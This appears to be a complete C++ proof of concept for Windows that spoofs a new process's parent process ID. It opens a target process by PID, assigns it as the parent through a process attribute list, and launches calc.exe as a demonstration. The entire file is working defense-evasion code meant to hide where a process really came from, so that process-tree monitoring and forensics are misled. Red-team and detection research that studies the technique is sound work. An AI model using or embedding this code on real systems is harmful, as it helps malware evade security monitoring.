#include <tchar.h>
#include <windows.h>
#include <iostream>
#include <string>

bool spoofPPID(IN DWORD dwPid, IN const char* cmdPath, OUT HANDLE* hProcess, OUT HANDLE* hThread)
{
    STARTUPINFOEXA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    PPROC_THREAD_ATTRIBUTE_LIST pTAL = NULL;
    SIZE_T sTALSize = NULL;

    InitializeProcThreadAttributeList(NULL, 1, 0, &sTALSize);
    pTAL = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sTALSize);
    if (pTAL == NULL) {
        printf("[-] HeapAlloc failed with error: %d\n", GetLastError());
        return FALSE;
    }

    if (!InitializeProcThreadAttributeList(pTAL, 1, 0, &sTALSize)) {
        printf("[-] InitializeProcThreadAttributeList failed with error: %d\n", GetLastError());
        return FALSE;
    }

    HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (hParentProcess == NULL) {
        printf("[-] OpenProcess failed with error: %d\n", GetLastError());
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(pTAL, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        printf("[-] UpdateProcThreadAttribute failed with error: %d\n", GetLastError());
        return FALSE;
    }

    si.lpAttributeList = pTAL;

    if (!CreateProcessA(NULL, (LPSTR)cmdPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
        printf("[-] CreateProcessA failed with error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Process created: %d\n", pi.dwProcessId);

    //Cleaning Up
    DeleteProcThreadAttributeList(pTAL);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hParentProcess);

    return TRUE;
}

int main()
{
    DWORD testPid = 27980;  // Replace with a valid process ID to test
    const char* cmdPath = "C:\\Windows\\System32\\calc.exe"; // Replace with your executable path
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;

    if (spoofPPID(testPid, cmdPath, &hProcess, &hThread)) {
        printf("[+] PPID spoofing successful.\n");
    }
    else {
        printf("[-] PPID spoofing failed.\n");
    }

    return 0;
}
